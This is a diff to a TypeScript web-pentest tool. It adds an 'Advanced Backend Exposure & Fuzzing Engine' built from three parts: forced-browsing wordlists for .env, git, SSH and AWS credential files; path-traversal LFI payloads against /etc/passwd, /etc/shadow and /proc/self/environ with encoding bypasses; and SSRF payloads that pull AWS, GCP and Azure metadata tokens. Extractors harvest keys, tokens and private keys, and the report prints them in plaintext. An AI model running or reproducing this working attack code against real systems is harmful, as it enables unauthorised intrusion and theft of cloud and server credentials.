@@ -7717,6 +7717,26 @@ export async function runWebPentest(targetUrl: string): Promise<{
     validSecrets: number;
     invalidSecrets: number;
   };
+  backendExposures: {
+    results: Array<{
+      vector: "forced_browsing" | "lfi_fuzz" | "ssrf_metadata";
+      severity: "critical" | "high" | "medium";
+      url: string;
+      attackVector: string;
+      payload: string;
+      rawContent: string;
+      extractedSecrets: Array<{ key: string; value: string }>;
+      httpStatus: number;
+      contentType: string;
+      responseSize: number;
+      timestamp: string;
+    }>;
+    forcedBrowsing: { totalProbed: number; exposed: number; secretsExtracted: number };
+    lfiFuzzing: { totalPayloads: number; targetsFound: number; confirmed: number; secretsExtracted: number };
+    ssrfMetadata: { totalPayloads: number; targetsFound: number; confirmed: number; credentialsExtracted: number };
+    totalBackendExposures: number;
+    totalSecretsFromBackend: number;
+  };
   generatedAt: string;
   targetUrl: string;
 }> {
@@ -9011,6 +9031,421 @@ if __name__ == "__main__":
     }
   });
 
+  // ═══════════════════════════════════════════════════════════════
+  // ADVANCED BACKEND EXPOSURE & FUZZING ENGINE v1.0
+  // Active Server Exploitation: Forced Browsing, LFI Fuzzing, SSRF Metadata
+  // ═══════════════════════════════════════════════════════════════
+
+  // --- Types ---
+  interface BackendExposure {
+    vector: "forced_browsing" | "lfi_fuzz" | "ssrf_metadata";
+    severity: "critical" | "high" | "medium";
+    url: string;
+    attackVector: string;
+    payload: string;
+    rawContent: string;
+    extractedSecrets: Array<{ key: string; value: string }>;
+    httpStatus: number;
+    contentType: string;
+    responseSize: number;
+    timestamp: string;
+  }
+  const backendExposureResults: BackendExposure[] = [];
+
+  // ═══ TASK 1: Forced Browsing & Secret File Bruteforcing ═══
+  const forcedBrowsingWordlist = [
+    // High-priority secret files
+    "/.env", "/.env.backup", "/.env.local", "/.env.production", "/.env.staging",
+    "/.env.dev", "/.env.old", "/.env.bak", "/.env.save", "/.env.dist",
+    "/api/.env", "/app/.env", "/backend/.env", "/server/.env", "/src/.env",
+    "/config/.env", "/web/.env", "/public/.env", "/private/.env",
+    // Git exposure
+    "/.git/config", "/.git/HEAD", "/.git/index", "/.git/COMMIT_EDITMSG",
+    "/.git/description", "/.git/info/exclude", "/.git/logs/HEAD",
+    "/.gitignore",
+    // Cloud & Infra credentials
+    "/.aws/credentials", "/.aws/config",
+    "/.ssh/id_rsa", "/.ssh/id_rsa.pub", "/.ssh/authorized_keys", "/.ssh/known_hosts",
+    "/docker-compose.yml", "/docker-compose.yaml", "/docker-compose.override.yml",
+    "/Dockerfile", "/.dockerenv",
+    // CMS & Framework configs
+    "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php.save",
+    "/wp-config.php~", "/wp-config.php.txt", "/wp-config.php.swp",
+    "/configuration.php.bak", "/config.php.bak", "/settings.php.bak",
+    // Server configs
+    "/server.xml", "/web.xml", "/context.xml",
+    "/application.properties", "/application.yml", "/application.yaml",
+    "/appsettings.json", "/appsettings.Development.json", "/appsettings.Production.json",
+    // Database dumps
+    "/backup.sql", "/dump.sql", "/db.sql", "/database.sql", "/data.sql",
+    "/backup.sql.gz", "/dump.sql.gz", "/db_backup.sql",
+    // Config files
+    "/config.json", "/config.yml", "/config.yaml", "/config.xml",
+    "/settings.json", "/settings.yml", "/secrets.json", "/secrets.yml",
+    "/credentials.json", "/credentials.yml",
+    // Deployment & CI
+    "/.circleci/config.yml", "/.github/workflows/deploy.yml",
+    "/.travis.yml", "/Jenkinsfile", "/.gitlab-ci.yml",
+    // Package managers with potential secrets
+    "/.npmrc", "/.yarnrc", "/composer.json", "/Gemfile",
+    // Debug & Info
+    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
+    "/server-status", "/server-info",
+    "/actuator/env", "/actuator/configprops", "/actuator/heapdump",
+    // API docs that leak internal structure
+    "/swagger.json", "/openapi.json", "/api-docs", "/graphql",
+    "/api/v1/swagger.json", "/api/v2/swagger.json",
+    // Firebase
+    "/__/firebase/init.json",
+    // Kubernetes
+    "/api/v1/namespaces", "/healthz", "/metrics",
+  ];
+
+  const envKvExtractor = /^([A-Z_][A-Z0-9_]*)\s*=\s*["']?([^\n"']+)["']?\s*$/gm;
+  const jsonKeyExtractor = (body: string): Array<{ key: string; value: string }> => {
+    const secrets: Array<{ key: string; value: string }> = [];
+    try {
+      const obj = JSON.parse(body);
+      const walk = (o: Record<string, unknown>, prefix = ""): void => {
+        for (const [k, v] of Object.entries(o)) {
+          const fullKey = prefix ? `${prefix}.${k}` : k;
+          if (typeof v === "string" && v.length >= 4 && v.length < 2000 && /password|secret|key|token|credential|auth|api_key|access|private|master|salt|hash|db_|mongo|redis|smtp|aws_|gcp_|azure|sendgrid|stripe|twilio|openai/i.test(fullKey)) {
+            secrets.push({ key: fullKey, value: v });
+          } else if (typeof v === "object" && v !== null && !Array.isArray(v)) {
+            walk(v as Record<string, unknown>, fullKey);
+          }
+        }
+      };
+      walk(obj);
+    } catch {}
+    return secrets;
+  };
+  const yamlKvExtractor = (body: string): Array<{ key: string; value: string }> => {
+    const secrets: Array<{ key: string; value: string }> = [];
+    const re = /^(\s*)([a-zA-Z_][a-zA-Z0-9_]*)\s*:\s*["']?([^\n"'#]+)["']?\s*$/gm;
+    let m: RegExpExecArray | null;
+    while ((m = re.exec(body)) !== null) {
+      if (/password|secret|key|token|credential|auth|api_key|access|private|db_|mongo|redis|smtp|aws|gcp|azure/i.test(m[2]) && m[3].trim().length >= 4) {
+        secrets.push({ key: m[2], value: m[3].trim() });
+      }
+    }
+    return secrets;
+  };
+
+  const forcedBrowsingProbes = forcedBrowsingWordlist.map(async (path) => {
+    const fullUrl = baseUrl + path;
+    const r = await probeFetch(fullUrl, { timeoutMs: 8_000 });
+    if (!r || r.status !== 200 || r.body.length < 10) return;
+    // Skip HTML error pages (real config files are never HTML)
+    if (/^\s*<!DOCTYPE|^\s*<html|^\s*<head/i.test(r.body.slice(0, 200))) return;
+    // Skip generic "not found" JSON responses
+    if (r.body.length < 50 && /not.?found|error|denied/i.test(r.body)) return;
+
+    const extractedSecrets: Array<{ key: string; value: string }> = [];
+    const contentType = r.headers["content-type"] || "";
+
+    // .env style key=value extraction
+    if (/=/.test(r.body) && !/^\s*[{<]/.test(r.body.trim())) {
+      const re = new RegExp(envKvExtractor.source, envKvExtractor.flags);
+      let m: RegExpExecArray | null;
+      while ((m = re.exec(r.body)) !== null) {
+        if (m[2].trim().length >= 4 && !/^(true|false|yes|no|null|undefined|none|0|1)$/i.test(m[2].trim())) {
+          extractedSecrets.push({ key: m[1], value: m[2].trim() });
+        }
+      }
+    }
+
+    // JSON extraction
+    if (contentType.includes("json") || r.body.trim().startsWith("{") || r.body.trim().startsWith("[") || path.endsWith(".json")) {
+      extractedSecrets.push(...jsonKeyExtractor(r.body));
+    }
+
+    // YAML extraction
+    if (path.endsWith(".yml") || path.endsWith(".yaml") || contentType.includes("yaml")) {
+      extractedSecrets.push(...yamlKvExtractor(r.body));
+    }
+
+    // Git config extraction
+    if (path.includes(".git/")) {
+      const urlMatch = r.body.match(/url\s*=\s*(.+)/g);
+      const emailMatch = r.body.match(/email\s*=\s*(.+)/g);
+      const tokenMatch = r.body.match(/token\s*=\s*(.+)/g);
+      if (urlMatch) urlMatch.forEach(u => extractedSecrets.push({ key: "git_remote_url", value: u.split("=")[1].trim() }));
+      if (emailMatch) emailMatch.forEach(e => extractedSecrets.push({ key: "git_email", value: e.split("=")[1].trim() }));
+      if (tokenMatch) tokenMatch.forEach(t => extractedSecrets.push({ key: "git_token", value: t.split("=")[1].trim() }));
+    }
+
+    // SSH key detection
+    if (/-----BEGIN\s+(RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/.test(r.body)) {
+      extractedSecrets.push({ key: "PRIVATE_KEY", value: r.body.slice(0, 500) });
+    }
+
+    // Only report if we found real content (not generic pages)
+    const hasEnvVars = extractedSecrets.length > 0;
+    const hasRawSecretContent = /DB_PASS|DB_PASSWORD|SECRET_KEY|API_KEY|AWS_SECRET|PRIVATE_KEY|access_token|AccessKeyId|-----BEGIN/i.test(r.body);
+
+    if (hasEnvVars || hasRawSecretContent) {
+      backendExposureResults.push({
+        vector: "forced_browsing",
+        severity: "critical",
+        url: fullUrl,
+        attackVector: `Forced Browsing → GET ${path}`,
+        payload: path,
+        rawContent: r.body.slice(0, 5000),
+        extractedSecrets,
+        httpStatus: r.status,
+        contentType,
+        responseSize: r.body.length,
+        timestamp: new Date().toISOString(),
+      });
+
+      // Feed extracted secrets into the main secrets pipeline
+      for (const s of extractedSecrets) {
+        if (!poeSecrets.some(ps => ps.value === s.value)) {
+          poeSecrets.push({ type: s.key, value: s.value, source: `${fullUrl} (Forced Browsing)` });
+        }
+      }
+
+      vulnResults.push({
+        type: `Backend Exposure: ${path}`,
+        severity: "critical",
+        url: fullUrl,
+        payload: path,
+        evidence: `Server returned 200 OK with ${extractedSecrets.length} secrets — ${r.body.length} bytes raw backend config`,
+        exploitable: true,
+      });
+    }
+  });
+
+  // ═══ TASK 2: Advanced LFI Parameter Fuzzing ═══
+  const advancedLFIPayloads = [
+    { payload: "../../../../../../../../etc/passwd", indicator: /root:x:0:0:|root:.*:0:0|daemon:|bin:|sys:|nobody:/i, leakType: "OS passwd" },
+    { payload: "../../../../../../../../var/www/html/.env", indicator: /^[A-Z_]+=.+$/m, leakType: ".env via LFI" },
+    { payload: "..%2f..%2f..%2f..%2f.env", indicator: /^[A-Z_]+=.+$/m, leakType: ".env (url-encoded)" },
+    { payload: "../../../../../../../../etc/shadow", indicator: /root:\$|root:\*|root:!/i, leakType: "OS shadow" },
+    { payload: "../../../../../../../../proc/self/environ", indicator: /PATH=|HOME=|USER=|HOSTNAME=/i, leakType: "proc environ" },
+    { payload: "../../../../../../../../proc/self/cmdline", indicator: /[a-z]/i, leakType: "proc cmdline" },
+    { payload: "../../../../../../../../var/www/.env", indicator: /DB_PASSWORD|SECRET_KEY|API_KEY|APP_KEY/i, leakType: "App .env" },
+    { payload: "../../../../../../../../app/.env", indicator: /DB_PASSWORD|SECRET_KEY|API_KEY|APP_KEY/i, leakType: "App .env" },
+    { payload: "../../../../../../../../home/ubuntu/.env", indicator: /DB_PASSWORD|SECRET_KEY|API_KEY/i, leakType: "Home .env" },
+    { payload: "....//....//....//....//etc/passwd", indicator: /root:x:0:0:|daemon:/i, leakType: "passwd (bypass)" },
+    { payload: "..%252f..%252f..%252f..%252fetc%252fpasswd", indicator: /root:x:0:0:|daemon:/i, leakType: "passwd (double-encoded)" },
+    { payload: "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", indicator: /root:x:0:0:/i, leakType: "passwd (overlong UTF-8)" },
+    { payload: "php://filter/convert.base64-encode/resource=/etc/passwd", indicator: /[A-Za-z0-9+/=]{40,}/, leakType: "PHP filter wrapper" },
+    { payload: "/etc/passwd%00", indicator: /root:x:0:0:/i, leakType: "null byte bypass" },
+    { payload: "....\/....\/....\/....\/etc/passwd", indicator: /root:x:0:0:/i, leakType: "backslash bypass" },
+  ];
+
+  // Fuzz parameter names commonly vulnerable to LFI
+  const lfiParamNames = ["file", "page", "doc", "path", "template", "include", "load", "read", "view", "display", "lang", "dir", "name", "module", "content", "action", "type", "url", "img", "src"];
+
+  // Collect all URL parameters from discovered endpoints
+  const allParamsFromEndpoints: string[] = [];
+  for (const ep of apiEndpoints) {
+    try { const u = new URL(ep, baseUrl); u.searchParams.forEach((_, k) => allParamsFromEndpoints.push(k)); } catch {}
+  }
+  for (const form of webData.allForms) {
+    for (const input of form.inputs) allParamsFromEndpoints.push(input.name);
+  }
+  const vulnParamEndpoints = apiEndpoints.filter(u => {
+    try { const uObj = new URL(u, baseUrl); return [...uObj.searchParams.keys()].some(k => lfiParamNames.some(p => k.toLowerCase().includes(p))); } catch { return false; }
+  }).slice(0, 10);
+  // Also try injecting LFI params on discovered form actions
+  const vulnFormActions = webData.allForms.filter(f => f.inputs.some(i => lfiParamNames.some(p => i.name.toLowerCase().includes(p)))).map(f => f.action).slice(0, 5);
+
+  const advancedLFITargets = [...new Set([...vulnParamEndpoints, ...vulnFormActions])];
+  // If no parameter targets found, try common pages with injected params
+  if (advancedLFITargets.length === 0) {
+    const commonLFIPages = ["/index.php", "/page.php", "/download.php", "/view.php", "/include.php", "/file.php", "/read.php", "/", "/api/file", "/api/download"];
+    for (const pg of commonLFIPages) {
+      advancedLFITargets.push(baseUrl + pg);
+    }
+  }
+
+  const advancedLFIProbes = advancedLFITargets.flatMap(url =>
+    advancedLFIPayloads.map(async ({ payload, indicator, leakType }) => {
+      // Try injecting into existing params
+      let testUrl: string;
+      try {
+        const uObj = new URL(url, baseUrl);
+        const params = [...uObj.searchParams.keys()];
+        const vulnParam = params.find(k => lfiParamNames.some(p => k.toLowerCase().includes(p)));
+        if (vulnParam) {
+          uObj.searchParams.set(vulnParam, payload);
+          testUrl = uObj.href;
+        } else {
+          testUrl = `${url.split("?")[0]}?file=${encodeURIComponent(payload)}`;
+        }
+      } catch {
+        testUrl = `${url.split("?")[0]}?file=${encodeURIComponent(payload)}`;
+      }
+
+      const r = await probeFetch(testUrl, { timeoutMs: 8_000 });
+      if (!r || r.status >= 500) return;
+      if (indicator.test(r.body) && r.body.length > 50) {
+        // Confirm it's not an HTML error page
+        if (/^\s*<!DOCTYPE|^\s*<html/i.test(r.body.slice(0, 200)) && !/root:x:0:0|DB_PASSWORD|SECRET_KEY/i.test(r.body)) return;
+
+        const extractedSecrets: Array<{ key: string; value: string }> = [];
+        // Extract env vars from LFI response
+        if (/^[A-Z_]+=.+$/m.test(r.body)) {
+          const re = new RegExp(envKvExtractor.source, envKvExtractor.flags);
+          let m: RegExpExecArray | null;
+          while ((m = re.exec(r.body)) !== null) {
+            if (m[2].trim().length >= 4) extractedSecrets.push({ key: m[1], value: m[2].trim() });
+          }
+        }
+        // Extract from passwd
+        if (/root:x:0:0:/i.test(r.body)) {
+          const users = r.body.split("\n").filter((l: string) => l.includes(":") && !l.startsWith("#")).slice(0, 20);
+          users.forEach((u: string) => extractedSecrets.push({ key: "system_user", value: u.split(":")[0] }));
+        }
+
+        backendExposureResults.push({
+          vector: "lfi_fuzz",
+          severity: "critical",
+          url: testUrl,
+          attackVector: `LFI Fuzzing → ${payload}`,
+          payload,
+          rawContent: r.body.slice(0, 5000),
+          extractedSecrets,
+          httpStatus: r.status,
+          contentType: r.headers["content-type"] || "",
+          responseSize: r.body.length,
+          timestamp: new Date().toISOString(),
+        });
+
+        for (const s of extractedSecrets) {
+          if (/password|secret|key|token|credential/i.test(s.key) && !poeSecrets.some(ps => ps.value === s.value)) {
+            poeSecrets.push({ type: s.key, value: s.value, source: `${testUrl} (LFI Fuzz)` });
+          }
+        }
+
+        vulnResults.push({
+          type: `Backend LFI: ${leakType}`,
+          severity: "critical",
+          url: testUrl,
+          payload,
+          evidence: `LFI confirmed — ${leakType} leaked, ${extractedSecrets.length} secrets extracted — ${r.body.length} bytes`,
+          exploitable: true,
+        });
+      }
+    })
+  );
+
+  // ═══ TASK 3: SSRF to Cloud Metadata Exfiltration ═══
+  const advancedSSRFPayloads = [
+    // AWS
+    { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", provider: "AWS IAM", indicator: /AccessKeyId|SecretAccessKey|Token|Code.*Success|arn:aws/i },
+    { payload: "http://169.254.169.254/latest/meta-data/", provider: "AWS Metadata", indicator: /ami-id|instance-id|hostname|public-ipv4|local-ipv4|iam/i },
+    { payload: "http://169.254.169.254/latest/user-data", provider: "AWS UserData", indicator: /#!/i },
+    { payload: "http://169.254.169.254/latest/dynamic/instance-identity/document", provider: "AWS Identity", indicator: /instanceId|accountId|region|imageId|availabilityZone/i },
+    // GCP
+    { payload: "http://metadata.google.internal/computeMetadata/v1/", provider: "GCP Metadata", indicator: /project|attributes|hostname|instance|zone/i },
+    { payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", provider: "GCP Token", indicator: /access_token|token_type|expires_in/i },
+    { payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id", provider: "GCP Project", indicator: /^[a-z][a-z0-9-]+$/i },
+    // Azure
+    { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", provider: "Azure IMDS", indicator: /vmId|name|location|resourceGroup|subscriptionId/i },
+    { payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", provider: "Azure Token", indicator: /access_token|token_type|expires_on/i },
+    // DigitalOcean
+    { payload: "http://169.254.169.254/metadata/v1.json", provider: "DigitalOcean", indicator: /droplet_id|hostname|region|floating_ip/i },
+    // Internal services
+    { payload: "http://127.0.0.1:6379/INFO", provider: "Redis", indicator: /redis_version|connected_clients|used_memory/i },
+    { payload: "http://127.0.0.1:9200/", provider: "Elasticsearch", indicator: /cluster_name|cluster_uuid|lucene_version/i },
+    { payload: "http://127.0.0.1:5984/", provider: "CouchDB", indicator: /couchdb|version|vendor/i },
+    { payload: "http://127.0.0.1:8500/v1/agent/self", provider: "Consul", indicator: /Config|Member|DebugConfig/i },
+  ];
+
+  // URL parameter names commonly vulnerable to SSRF
+  const ssrfParamNames = ["url", "link", "src", "href", "callback", "webhook", "fetch", "proxy", "redirect", "target", "site", "endpoint", "uri", "path", "resource", "feed", "import", "file", "dest", "download", "load", "request", "navigate", "image", "img", "preview", "render"];
+
+  const ssrfVulnEndpoints = apiEndpoints.filter(u => {
+    try { const uObj = new URL(u, baseUrl); return [...uObj.searchParams.keys()].some(k => ssrfParamNames.some(p => k.toLowerCase().includes(p))); } catch { return false; }
+  }).slice(0, 10);
+  const ssrfFormActions = webData.allForms.filter(f => f.inputs.some(i => ssrfParamNames.some(p => i.name.toLowerCase().includes(p)))).map(f => f.action).slice(0, 5);
+  const advancedSSRFTargets = [...new Set([...ssrfVulnEndpoints, ...ssrfFormActions])];
+
+  // If no param targets, try common SSRF-vulnerable paths
+  if (advancedSSRFTargets.length === 0) {
+    const commonSSRFPages = ["/api/fetch", "/api/proxy", "/api/preview", "/api/render", "/api/url", "/api/image", "/api/download", "/proxy", "/fetch", "/preview"];
+    for (const pg of commonSSRFPages) {
+      advancedSSRFTargets.push(baseUrl + pg);
+    }
+  }
+
+  const advancedSSRFProbes = advancedSSRFTargets.flatMap(url =>
+    advancedSSRFPayloads.map(async ({ payload, provider, indicator }) => {
+      let testUrl: string;
+      try {
+        const uObj = new URL(url, baseUrl);
+        const params = [...uObj.searchParams.keys()];
+        const vulnParam = params.find(k => ssrfParamNames.some(p => k.toLowerCase().includes(p)));
+        if (vulnParam) {
+          uObj.searchParams.set(vulnParam, payload);
+          testUrl = uObj.href;
+        } else {
+          testUrl = `${url.split("?")[0]}?url=${encodeURIComponent(payload)}`;
+        }
+      } catch {
+        testUrl = `${url.split("?")[0]}?url=${encodeURIComponent(payload)}`;
+      }
+
+      const r = await probeFetch(testUrl, { timeoutMs: 10_000 });
+      if (!r || r.status >= 500) return;
+      if (indicator.test(r.body) && r.body.length > 20) {
+        if (/^\s*<!DOCTYPE|^\s*<html/i.test(r.body.slice(0, 200)) && !/AccessKeyId|access_token|ami-id/i.test(r.body)) return;
+
+        const extractedSecrets: Array<{ key: string; value: string }> = [];
+        // Extract STS tokens
+        try {
+          const json = JSON.parse(r.body);
+          if (json.AccessKeyId) extractedSecrets.push({ key: "AWS_ACCESS_KEY_ID", value: json.AccessKeyId });
+          if (json.SecretAccessKey) extractedSecrets.push({ key: "AWS_SECRET_ACCESS_KEY", value: json.SecretAccessKey });
+          if (json.Token) extractedSecrets.push({ key: "AWS_SESSION_TOKEN", value: String(json.Token).slice(0, 300) });
+          if (json.access_token) extractedSecrets.push({ key: `${provider}_ACCESS_TOKEN`, value: String(json.access_token).slice(0, 300) });
+          if (json.accountId) extractedSecrets.push({ key: "AWS_ACCOUNT_ID", value: json.accountId });
+          if (json.subscriptionId) extractedSecrets.push({ key: "AZURE_SUBSCRIPTION_ID", value: json.subscriptionId });
+        } catch {
+          const akMatch = r.body.match(/"AccessKeyId"\s*:\s*"([^"]+)"/);
+          if (akMatch) extractedSecrets.push({ key: "AWS_ACCESS_KEY_ID", value: akMatch[1] });
+          const skMatch = r.body.match(/"SecretAccessKey"\s*:\s*"([^"]+)"/);
+          if (skMatch) extractedSecrets.push({ key: "AWS_SECRET_ACCESS_KEY", value: skMatch[1] });
+          const tokenMatch = r.body.match(/"access_token"\s*:\s*"([^"]+)"/);
+          if (tokenMatch) extractedSecrets.push({ key: `${provider}_ACCESS_TOKEN`, value: tokenMatch[1].slice(0, 300) });
+        }
+
+        backendExposureResults.push({
+          vector: "ssrf_metadata",
+          severity: "critical",
+          url: testUrl,
+          attackVector: `SSRF → ${provider} (${payload})`,
+          payload,
+          rawContent: r.body.slice(0, 5000),
+          extractedSecrets,
+          httpStatus: r.status,
+          contentType: r.headers["content-type"] || "",
+          responseSize: r.body.length,
+          timestamp: new Date().toISOString(),
+        });
+
+        for (const s of extractedSecrets) {
+          if (!poeSecrets.some(ps => ps.value === s.value)) {
+            poeSecrets.push({ type: s.key, value: s.value, source: `${testUrl} (SSRF ${provider})` });
+          }
+        }
+
+        vulnResults.push({
+          type: `Backend SSRF: ${provider}`,
+          severity: "critical",
+          url: testUrl,
+          payload,
+          evidence: `SSRF confirmed — ${provider} metadata leaked, ${extractedSecrets.length} credentials extracted — ${r.body.length} bytes`,
+          exploitable: true,
+        });
+      }
+    })
+  );
+
   // ═══ RUN ALL PROBES IN PARALLEL ═══
   await Promise.allSettled([
     ...sqliProbes, ...formSqliProbes, ...blindSqliProbes, ...timeSqliProbes,
@@ -9023,6 +9458,7 @@ if __name__ == "__main__":
     ...poePhase1Probes, ...poeCrawledScanProbes,
     ...poePhase2Probes, ...poeLFIProbes,
     ...poeSSRFProbes, ...poeSSRFFollowUp,
+    ...forcedBrowsingProbes, ...advancedLFIProbes, ...advancedSSRFProbes,
   ]);
 
   // ═══════════════════════════════════════════════════════════════
@@ -10484,6 +10920,13 @@ ${poeLFIResults.map(r => `  ${r.leakType}: ${r.url}`).join("\n")}
 - SSRF مع بيانات اعتماد سحابية: ${poeSSRFResults.filter(r => r.credentialsFound).length}
 ${poeSSRFResults.map(r => `  ${r.provider}: ${r.credentialsFound ? "بيانات اعتماد مستخرجة" : "بيانات وصفية فقط"}`).join("\n")}
 
+نتائج محرك استغلال الخادم المتقدم (Advanced Backend Exposure & Fuzzing Engine):
+- اكتشافات Forced Browsing: ${backendExposureResults.filter(e => e.vector === "forced_browsing").length}
+- اكتشافات LFI Fuzzing: ${backendExposureResults.filter(e => e.vector === "lfi_fuzz").length}
+- اكتشافات SSRF Metadata: ${backendExposureResults.filter(e => e.vector === "ssrf_metadata").length}
+${backendExposureResults.map(e => `  [CRITICAL] ${e.attackVector}: ${e.url} — ${e.extractedSecrets.length} secrets extracted — ${e.responseSize} bytes`).join("\n")}
+${backendExposureResults.flatMap(e => e.extractedSecrets.map(s => `    → [${s.key}] ${s.value}`)).join("\n")}
+
 اكتب تقريراً يشمل:
 1. ملخص تنفيذي
 2. الثغرات الحرجة مع التفاصيل التقنية
@@ -10597,9 +11040,9 @@ ${poeSSRFResults.map(r => `  ${r.provider}: ${r.credentialsFound ? "بيانات
       crypto: webCipher7Crypto,
       aws: webCipher7AWS,
       securityHeaders: secHeaders,
-      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length + webData.domXssSinks.length + webData.cookies.filter(c => c.issues.length > 0).length + infoDisclosures.length + authWeaknesses.length + poeSecrets.length + poeConfigFiles.length + poeLFIResults.length + poeSSRFResults.length,
-      phasesExecuted: 20,
-      engineVersion: "13.0-web-poe-active",
+      totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length + webData.domXssSinks.length + webData.cookies.filter(c => c.issues.length > 0).length + infoDisclosures.length + authWeaknesses.length + poeSecrets.length + poeConfigFiles.length + poeLFIResults.length + poeSSRFResults.length + backendExposureResults.length,
+      phasesExecuted: 25,
+      engineVersion: "14.0-web-backend-fuzzing",
     },
     proof_of_exposure: {
       extracted_plaintext_secrets: poeSecrets.map(s => ({ type: s.type, value: s.value, source: s.source })),
@@ -10611,6 +11054,40 @@ ${poeSSRFResults.map(r => `  ${r.provider}: ${r.credentialsFound ? "بيانات
       totalValidated: secretValidations.length,
       validSecrets: secretValidations.filter(v => v.status === "valid").length,
       invalidSecrets: secretValidations.filter(v => v.status === "invalid").length,
+    },
+    backendExposures: {
+      results: backendExposureResults.map(e => ({
+        vector: e.vector,
+        severity: e.severity,
+        url: e.url,
+        attackVector: e.attackVector,
+        payload: e.payload,
+        rawContent: e.rawContent,
+        extractedSecrets: e.extractedSecrets,
+        httpStatus: e.httpStatus,
+        contentType: e.contentType,
+        responseSize: e.responseSize,
+        timestamp: e.timestamp,
+      })),
+      forcedBrowsing: {
+        totalProbed: forcedBrowsingWordlist.length,
+        exposed: backendExposureResults.filter(e => e.vector === "forced_browsing").length,
+        secretsExtracted: backendExposureResults.filter(e => e.vector === "forced_browsing").reduce((s, e) => s + e.extractedSecrets.length, 0),
+      },
+      lfiFuzzing: {
+        totalPayloads: advancedLFIPayloads.length,
+        targetsFound: advancedLFITargets.length,
+        confirmed: backendExposureResults.filter(e => e.vector === "lfi_fuzz").length,
+        secretsExtracted: backendExposureResults.filter(e => e.vector === "lfi_fuzz").reduce((s, e) => s + e.extractedSecrets.length, 0),
+      },
+      ssrfMetadata: {
+        totalPayloads: advancedSSRFPayloads.length,
+        targetsFound: advancedSSRFTargets.length,
+        confirmed: backendExposureResults.filter(e => e.vector === "ssrf_metadata").length,
+        credentialsExtracted: backendExposureResults.filter(e => e.vector === "ssrf_metadata").reduce((s, e) => s + e.extractedSecrets.length, 0),
+      },
+      totalBackendExposures: backendExposureResults.length,
+      totalSecretsFromBackend: backendExposureResults.reduce((s, e) => s + e.extractedSecrets.length, 0),
     },
     generatedAt: new Date().toISOString(),
     targetUrl: webData.url,
